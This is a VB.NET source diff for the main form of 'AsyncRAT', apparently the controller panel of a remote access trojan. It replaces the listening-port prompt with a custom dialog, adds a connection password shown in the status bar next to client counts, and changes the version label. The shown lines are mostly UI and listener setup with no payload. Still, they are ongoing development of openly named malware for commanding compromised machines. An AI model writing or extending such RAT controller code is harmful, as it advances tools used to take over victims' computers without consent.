@@ -26,13 +26,11 @@ Public Class Form1
         Dim Req_Out As New Threading.Thread(New Threading.ThreadStart(AddressOf Pending.OutComing))
         Req_Out.Start()
 
-
         Try
-            Dim PORTS As String = InputBox("Enter Ports", "AsyncRAT", "8989,5656,2323")
-            If String.IsNullOrEmpty(PORTS) Then
-                Environment.Exit(0)
-            Else
-                Dim A As String() = Split(PORTS, ",")
+            Dim PORTS As New Intro
+            PORTS.ShowDialog()
+            If PORTS.OK = True Then
+                Dim A As String() = Split(PORTS.TextBox1.Text.Trim, ",")
                 For i As Integer = 0 To A.Length - 1
                     If Not String.IsNullOrWhiteSpace(A(i)) Then
                         Settings.Ports.Add(A(i))
@@ -41,6 +39,10 @@ Public Class Form1
                         listener.Start(A(i))
                     End If
                 Next
+                Settings.KEY = PORTS.TextBox2.Text
+                PORTS.Close()
+            Else
+                Environment.Exit(0)
             End If
         Catch ex As Exception
             Debug.WriteLine("URL " + ex.Message)
@@ -132,7 +134,7 @@ Public Class Form1
     Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
         Try
             ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]       Password [{3}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList),Settings.KEY)
-            Text = " AsyncRAT v1.0C // " + DateTime.Now
+            Text = " AsyncRAT " + Settings.VER + " // " + DateTime.Now
         Catch ex As Exception
             Debug.WriteLine("Timer_Status " + ex.Message)
         End Try
